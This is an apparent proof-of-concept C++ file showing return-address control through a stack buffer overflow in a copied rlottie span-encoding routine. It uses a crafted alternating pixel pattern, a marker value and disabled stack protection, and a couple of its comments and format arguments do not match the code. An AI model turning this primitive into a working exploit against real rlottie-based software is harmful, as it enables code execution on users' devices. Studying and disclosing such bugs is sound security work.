/*
 * rip_control.cpp 
  Proof of RIP control via rlottie bufferToRle overflow
 *
 * Build
 *   g++ -O0 -fno-stack-protector -no-pie -o rip_control rip_control.cpp
 *
 */

#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <signal.h>
#include <ucontext.h>
#include <unistd.h>

using uchar  = unsigned char;
using ushort = unsigned short;

// Cloned Span from vrle.h in rlottie
struct Span {
    short  x{0};
    short  y{0};
    ushort len{0};
    uchar  coverage{0};
};

// this is cloned bufferToRle from vrle.h
// writes unbounded spans into the buffer
static size_t bufferToRle(uchar *buffer, int bufferLen, int size,
                          int offsetX, int y, Span *out)
{
    size_t count = 0;
    uchar  value = buffer[0];
    int    curIndex = 0;

    size = offsetX < 0 ? size + offsetX : size;
    if (size > bufferLen) {
        return count;
    }
    for (int i = 0; i < size; i++) {
        uchar curValue = buffer[0];
        if (value != curValue) {
            if (value) {
                out->y = y;
                out->x = offsetX + curIndex;
                out->len = i - curIndex;
                out->coverage = value;
                out++;
                count++;
            }
            curIndex = i;
            value = curValue;
        }
        buffer++;
    }
    if (value) {
        out->y = y;
        out->x = offsetX + curIndex;
        out->len = size - curIndex;
        out->coverage = value;
        count++;
    }
    return count;
}

__attribute__((noinline))
static void trigger_overflow(uchar *array, int arrayLen, int effectiveWidth,
                             int offset, int marker_y)
{
    // this is the  buffer that bufferToRle overflows
    Span temp[256];  // 256 * 8 = 2048 bytes on stack 

    printf("  temp[] at:       %p — %p (%zu bytes)\n",
           (void*)temp, (void*)(temp + 256), sizeof(Span) * 256);
    fflush(stdout);

    // bufferToRle writes spans into temp[] with no bounds check.


    // With alternating input, it produces 585 spans so it overflows by 329
    size_t count = bufferToRle(array, arrayLen, effectiveWidth,
                               offset, (short)marker_y, temp);

    printf("  Spans produced:  %zu (capacity: 256)\n", count);
    printf("  OVERFLOW:        %zu spans = %zu bytes past buffer\n",
           count > 256 ? count - 256 : 0,
           count > 256 ? (count - 256) * sizeof(Span) : 0);
    printf("  Returning from function (saved RIP is overwritten)...\n");
    fflush(stdout);
}

static void crash_handler(int sig, siginfo_t *, void *ctx) {
    ucontext_t *uc = (ucontext_t *)ctx;
    unsigned long rip = uc->uc_mcontext.gregs[REG_RIP];
    unsigned long rbp = uc->uc_mcontext.gregs[REG_RBP];
    unsigned long rsp = uc->uc_mcontext.gregs[REG_RSP];

    char buf[1024];
    int n = snprintf(buf, sizeof(buf),
        "\n"
        "  SIGSEGV. return address overwritten\n"
        "  rip = 0x%016lx  \n"
        // corrupted saved frame ptr
        "  rbp = 0x%016lx \n"
        "  rsp = 0x%016lx\n"
        "\n",
        rip, rbp, rsp,
        (rbp >> 16) & 0xFFFF,
        (rbp >> 16) & 0xFFFF);
    (void)write(STDERR_FILENO, buf, n);
    _Exit(139);
}

int main() {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = crash_handler;
    sa.sa_flags = SA_SIGINFO;
    sigaction(SIGSEGV, &sa, nullptr);
    sigaction(SIGBUS, &sa, nullptr);


    // This is the exact pattern produced by XOR of two overlapping
    // mask span sets (one solid, one interleaved) in rleOpGeneric.
    constexpr int kBufSize = 1024;
    uchar array[kBufSize];
    for (int i = 0; i < kBufSize; i++)
        array[i] = (i & 1) ? 0xFF : 0x00;


    printf("  Pixel buffer: %d\n", kBufSize);

    // y=0x4141 is our marker 
    
    // it will appear in the overwritten
    // return address, proving attacker control of the value
    int marker_y = 0x4141;
    printf("  Marker y=0x%04x will appear in corrupted addresses\n\n", marker_y);
    trigger_overflow(array, kBufSize, kBufSize, 0, marker_y);

    // def should not reach here
    printf("  ERROR: function returned without crash\n");
    return 0;
}
